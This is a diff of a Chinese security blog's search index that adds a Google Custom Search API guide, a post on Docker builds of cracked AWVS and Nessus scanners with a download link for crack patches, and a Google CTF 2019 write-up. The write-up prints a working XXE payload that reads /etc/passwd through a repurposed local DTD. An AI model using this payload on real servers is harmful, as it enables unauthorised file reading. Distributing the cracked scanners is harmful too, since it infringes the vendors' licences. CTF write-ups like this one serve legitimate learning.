@@ -11,6 +11,64 @@
         <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近需要爬取一些 google 搜索结果，首先看的就是有没有相关的 API，官方有提供 API 查询，但爬取量有一定限制。</p><a id="more"></a><h2 id="太长不看版"><a href="#太长不看版" class="headerlink" title="太长不看版"></a>太长不看版</h2><ol><li>接口地址为 <code>https://www.googleapis.com/customsearch/v1?key={YOUR_KEY}&amp;q={SEARCH_WORDS}&amp;cx={YOUR_CX}&amp;start={10}&amp;num={10}</code></li><li>KEY 从 <a href="https://console.developers.google.com/apis/credentials" target="_blank" rel="noopener">谷歌云 API 控制台</a> 来的，需要有外币卡先注册谷歌云账号。但似乎付费的话就不用这个 KEY 了，仅用 CX 即可，这个待查。</li><li>CX 从 <a href="https://programmablesearchengine.google.com/cse/create/new" target="_blank" rel="noopener">谷歌可编程搜索</a> 中来</li><li>一天只有 100 次的免费搜索限额，只能查询前 100 条。如需增加则 5 刀 1000 次，但一天上限 10000。 次，对于我来说已经足够用了</li></ol><h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>首先来到 <a href="https://developers.google.com/custom-search/v1/overview?hl=en_US" target="_blank" rel="noopener">Google Developers</a> 的相关文档页面，可以看到大概的介绍。</p><h3 id="生成-API-KEY"><a href="#生成-API-KEY" class="headerlink" title="生成 API KEY"></a>生成 API KEY</h3><p>点击 overview 中的 <a href="https://developers.google.com/custom-search/v1/overview#api_key" target="_blank" rel="noopener">Get a Key</a>，此处需要登录谷歌帐号，以及注册谷歌云帐号（应该需要绑定外币信用卡）并且创建一个 project，此处略过不表，最后你会得到一个 Key。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/fO9LzFWuNT1IBr3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这个 Key 可以从<a href="https://console.developers.google.com/apis/credentials/key" target="_blank" rel="noopener">谷歌云控制台</a>中看到，建议加上应用限制和 API 限制，以防泄露后被滥用。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/z7Bj9Wt4ZPgAp61.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="生成-cx"><a href="#生成-cx" class="headerlink" title="生成 cx"></a>生成 cx</h3><p>cx 是 Google 可编程搜索引擎(Programmable Search Engine)的 id 标识，在此处 <a href="https://programmablesearchengine.google.com/cse/create/new" target="_blank" rel="noopener">新增搜索引擎</a> 可以获取。这里可以指定要搜索的网站，比如说我只希望通过该 API 搜索出来的网站是 shodan.io，谷歌语法里面相当于 <code>site:shodan.io</code>，可以这么设置：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/MnmrOZSitTsdGDX.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>新增完成之后点击修改搜索引擎，并点击设置，你就可以看到你的搜索引擎 id，就是我们说的 cx</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/bd3zuJ5wGfDUX2H.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>里面还有一些选项，自己可以看着修改~如果还想看看文档，可点击在页面下方一点的【以程序化方式访问】-【使用入门】</p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>JSON API 可以从 <a href="https://developers.google.com/custom-search/v1/introduction#api_overview" target="_blank" rel="noopener">文档</a> 中查看</p><p>完整的可请求参数如下，基本上和高级搜索保持一致：</p><pre><code>https://www.googleapis.com/customsearch/v1?q={searchTerms}&amp;num={count?}&amp;start={startIndex?}&amp;lr={language?}&amp;safe={safe?}&amp;cx={cx?}&amp;sort={sort?}&amp;filter={filter?}&amp;gl={gl?}&amp;cr={cr?}&amp;googlehost={googleHost?}&amp;c2coff={disableCnTwTranslation?}&amp;hq={hq?}&amp;hl={hl?}&amp;siteSearch={siteSearch?}&amp;siteSearchFilter={siteSearchFilter?}&amp;exactTerms={exactTerms?}&amp;excludeTerms={excludeTerms?}&amp;linkSite={linkSite?}&amp;orTerms={orTerms?}&amp;relatedSite={relatedSite?}&amp;dateRestrict={dateRestrict?}&amp;lowRange={lowRange?}&amp;highRange={highRange?}&amp;searchType={searchType}&amp;fileType={fileType?}&amp;rights={rights?}&amp;imgSize={imgSize?}&amp;imgType={imgType?}&amp;imgColorType={imgColorType?}&amp;imgDominantColor={imgDominantColor?}&amp;alt=json&quot;</code></pre><p>简化版：<code>https://www.googleapis.com/customsearch/v1?key={YOUR_KEY}&amp;q={SEARCH_WORDS}&amp;cx={YOUR_CX}&amp;start={10}&amp;num={10}</code></p><h2 id="存在的一些问题"><a href="#存在的一些问题" class="headerlink" title="存在的一些问题"></a>存在的一些问题</h2><h3 id="搜索结果与-API-不一致"><a href="#搜索结果与-API-不一致" class="headerlink" title="搜索结果与 API 不一致"></a>搜索结果与 API 不一致</h3><p>因为不同 IP 使用谷歌搜索会出现不一样的结果，比如美国和香港的 IP 访问必然会不一样。可以使用 API 中的 <code>lr</code> 参数修改语言选项，也可以在【修改搜索引擎】中修改语言和地区选项。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2020/08/08/B1XQjbknmqlYxGp.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="请求频率"><a href="#请求频率" class="headerlink" title="请求频率"></a>请求频率</h3><p>由于一天查的上限就这么多，所以等待时间尽量拉长吧，我 5-10s 请求一次没啥问题</p><h3 id="页数比第一页看到的结果数少"><a href="#页数比第一页看到的结果数少" class="headerlink" title="页数比第一页看到的结果数少"></a>页数比第一页看到的结果数少</h3><p>在第一页中，谷歌通常会显示比较多的结果，但是实际上很少有搜索结果能翻到100页的，甚至可能三四页就没了。这个是谷歌的策略吧，只会显示相关度比较高的页面……</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://developers.google.com/custom-search/docs/tutorial/introduction" target="_blank" rel="noopener">https://developers.google.com/custom-search/docs/tutorial/introduction</a><br><a href="https://developers.google.com/custom-search/v1/reference/rest" target="_blank" rel="noopener">https://developers.google.com/custom-search/v1/reference/rest</a></p></blockquote>]]></content>
       
       
+      <categories>
+          
+          <category> 爬虫 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>自用Docker版Nessus和WVS破解版</title>
+      <link href="/20190727/docker-nessus-awvs.html"/>
+      <url>/20190727/docker-nessus-awvs.html</url>
+      
+        <content type="html"><![CDATA[<p>自己一直在用的 Docker 版的 AWVS 和 Nessus，build 一次即可爽歪歪</p><a id="more"></a><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><ol><li>因为破解版有些问题，有时候一个星期后虽然仍然显示永久激活，但实际上并不可用，二次激活会出现奇怪的问题，每次要用的时候要是突然失去激活状态很容易令人崩溃</li><li>其它人发的 docker 不是很透明，担心不可控，还是自己写一个吧又不难……</li><li>破解版做一下隔离会比较好，毕竟服务器跑着很多奇怪的东西</li><li>docker 版重新部署很快，容易迁移</li></ol><p>因此萌发了用 docker 做扫描器的想法。</p><h2 id="关于破解补丁"><a href="#关于破解补丁" class="headerlink" title="关于破解补丁"></a>关于破解补丁</h2><p>破解补丁均用的是 52pojie 和 t00ls 中分享的，如果不放心的话大可自己替换，对 Dockerfile 稍作修改就可以了~</p><h2 id="WVS-快速部署"><a href="#WVS-快速部署" class="headerlink" title="WVS 快速部署"></a>WVS 快速部署</h2><ol><li>使用的 AWVS 安装包从官网下载或使用文末的百度网盘下载~</li><li>将破解补丁 <code>patch_awvs</code> 和安装包 <code>acunetix_trail.sh</code> 放在该目录下。安装包可以直接从官网下载，而破解补丁用的是广为流传的、52破解上的破解补丁，如有担心可以更换为自己信任的补丁</li><li>运行 Dockerfile</li><li>成功运行后需要手动进入容器进行激活，不过也很简便啦</li><li>用户名密码：<a href="mailto:admin@test.com" target="_blank" rel="noopener">admin@test.com</a>/Aa123456，可在 Dockerfile 自行修改</li></ol><pre><code class="bash">#build imagedocker build -t test/wvs .#按需修改docker run -m 2048M -d -p 13443:13443 --name wvs test/wvs#进入容器 patchdocker exec -it -u root wvs /bin/bash#运行&gt; ./patch_awvs</code></pre><p>目前的缺陷是数据库没法做持久化，不知道是我的姿势有误还是什么问题……解决方法是使用漏洞管控平台对接，如 <a href="https://gitee.com/gy071089/SecurityManageFramwork" target="_blank" rel="noopener">SeMF</a> 之类的 SIEM 平台</p><h2 id="Nessus-快速部署"><a href="#Nessus-快速部署" class="headerlink" title="Nessus 快速部署"></a>Nessus 快速部署</h2><ol><li>建立image</li><li>运行容器，等待插件安装完成即可</li></ol><pre><code class="bash">docker build -t test/nessus .#视情况决定是否使用Volumedocker run -d -m 2048M -v NESSUS_VOL:/opt/nessus -v /usr/share/zoneinfo:/usr/share/zoneinfo:ro -p 8834:8834 --name nessus test/nessus</code></pre><ol start="3"><li>修改密码，默认用户名为 Nessus</li></ol><pre><code class="bash">docker exec -it nessus /bin/bash/opt/nessus/sbin/nessuscli chpasswd Nessus</code></pre><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>非常 easy 的一套做法，妈妈再也不用担心我的破解版失效了~ Github 链接可点击或阅读原文查看：</p><p><a href="https://github.com/Leezj9671/SecDevices_docker" target="_blank" rel="noopener">https://github.com/Leezj9671/SecDevices_docker</a></p><p>关于破解版资源可访问百度网盘： </p><p>pan.baidu.com/s/1KT1vzGvZLSZcCxVLr5ZHXg 提取码: 6iak</p><p><em>资源均从52pojie、t00ls下载，可自行比对哈希值</em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 神兵利器 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> awvs </tag>
+            
+            <tag> nessus </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2019GoogleCTF-web-bnv XXE 题目</title>
+      <link href="/20190710/2019GoogleCTF-web-bnv.html"/>
+      <url>/20190710/2019GoogleCTF-web-bnv.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://capturetheflag.withgoogle.com" target="_blank" rel="noopener">Google CTF 2019</a> 刚过不久，来一波复现~</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目地址是 <a href="https://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">https://bnv.web.ctfcompetition.com/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248664c176f87951.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>题目描述：</p><blockquote><p>这是一个没有啥好看的 enterprise-ready™ Web应用程序。</p></blockquote><h2 id="搞！"><a href="#搞！" class="headerlink" title="搞！"></a>搞！</h2><p>点开链接一看，为什么这么黑……</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d2487576b0f474366.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>从网页标题和中间的图片很明显是盲文，结合题目，应该是一个盲人用的网站？</p><p>网页中央是说“请使用这个搜索引擎，找一个离你最近的组织”，下拉框有三个城市可选。</p><p>先看一下搜索会发生啥吧：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248878db21350572.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d2488610f3bb36760.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>POST 搜索接口一条 message，估计是盲文代码？然后返回了相应的信息。</p><p>看一下 JavaScript 是怎么写的吧：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d24884954c8528338.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>数一数 blindvalues 数组，刚好 26 个，猜想是不是字母一一对应捏，打开 Console 验证一下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d2489cf9840625370.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>跟 message 一模一样~ 先想一想，如果该题是 SQL 注入的话，那这题只能使用纯字母，并且忽略大小写，这个有点难整啊…… 使用特殊标点符号 Fuzz 一下，一点用都没有。</p><p>思来想去，搜到了一个奇妙的渗透手法：基于 Json 的 web 服务也有可能存在着 XXE 注入！试一试提交 XML：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248bd12f38049873.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>哎嘿？似乎可行？扔一个和提交 Json 相同意义的 XML 试试？</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ELEMENT message ANY&gt;]&gt;&lt;message&gt;135601360123502401401250&lt;/message&gt;</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248c7bbd42596019.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>哎嘿？似乎成功近在眼前了？赶紧翻 payload……整了好久，在 Burp 官网上看到了一个比较新颖的使用本地 DTD 读取文件的方法 <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener">Exploiting XXE to retrieve data by repurposing a local DTD</a></p><p>这个 payload 主要是利用错误信息来打印目标文件的内容，重新定义了 <code>docbookx.dtd</code> （一般有 Gnome 就有它）里面的 <code>ISOamso</code>。我们提交了这个 payload 之后，当导入本地的 DTD 文件时，会优先执行我们定义的 <code>ISOamso</code>，因此可以达成任意文件读取。</p><p>使用该 payload 成功读取：</p><pre><code class="xml">&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;    &#39;&gt;    %local_dtd;]&gt;</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248f4cc96d187582.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>猜一下路径 <code>/flag</code>，对啦✔</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/07/09/5d248fd122e0066657.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>算是一道不错的 XXE 利用题目，又学习到了新的利用方式~</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> XXE </tag>
+            
+        </tags>
       
     </entry>
     
@@ -57,8 +115,6 @@
       
       
         <tags>
-            
-            <tag> 神兵利器 </tag>
             
             <tag> git </tag>
             
@@ -341,7 +397,7 @@
       
         <tags>
             
-            <tag> Linux </tag>
+            <tag> VSFTP </tag>
             
         </tags>
       
@@ -414,12 +470,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> CTF </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -443,8 +493,6 @@
             
             <tag> CTF </tag>
             
-            <tag> Python </tag>
-            
             <tag> 加解密 </tag>
             
         </tags>
@@ -457,22 +505,22 @@
     
     
     <entry>
-      <title>关于我</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
+      <title>分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
       
-        <content type="html"><![CDATA[<h2 id="WhoAmI"><a href="#WhoAmI" class="headerlink" title="WhoAmI"></a>WhoAmI</h2><ul><li>热爱网络安全的同学，熟悉<strong>渗透测试</strong>、流量分析</li><li>四非大学 <strong>UJS</strong> 本科 18 应届毕业生</li><li>CTF 划水队员，获得过一些<em>说大不大说小不小</em>奖项</li><li>Python 爱好者，熟练 Python <del>的安装和卸载</del></li><li>偶尔玩玩前端，有一些前端的踩坑经历</li></ul><h2 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h2><ul><li>无实习经历，喜欢搞这搞那</li><li>曾就职中国移动，目前位于深圳某创业公司</li></ul><h2 id="Contact-Me"><a href="#Contact-Me" class="headerlink" title="Contact Me"></a>Contact Me</h2><ul><li>Mail: <a href="mailto://leezj9671@gmail.com" target="_blank" rel="noopener">GMail</a></li><li>QQ: R000REdPSlRHVVpUUU1aWUdNWVRHT0pUR1laVEk9PT0</li><li>Location: 广东深圳</li></ul>]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
     
     
     <entry>
-      <title>分类</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title>关于我</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h2 id="WhoAmI"><a href="#WhoAmI" class="headerlink" title="WhoAmI"></a>WhoAmI</h2><ul><li>热爱网络安全的同学，熟悉<strong>渗透测试</strong>、流量分析</li><li>四非大学 <strong>UJS</strong> 本科 18 应届毕业生</li><li>CTF 划水队员，获得过一些<em>说大不大说小不小</em>奖项</li><li>Python 爱好者，熟练 Python <del>的安装和卸载</del></li><li>偶尔玩玩前端，有一些前端的踩坑经历</li></ul><h2 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h2><ul><li>无实习经历，喜欢搞这搞那</li><li>曾就职中国移动，目前位于深圳某创业公司</li></ul><h2 id="Contact-Me"><a href="#Contact-Me" class="headerlink" title="Contact Me"></a>Contact Me</h2><ul><li>Mail: <a href="mailto://leezj9671@gmail.com" target="_blank" rel="noopener">GMail</a></li><li>QQ: R000REdPSlRHVVpUUU1aWUdNWVRHT0pUR1laVEk9PT0</li><li>Location: 广东深圳</li></ul>]]></content>
       
     </entry>
     
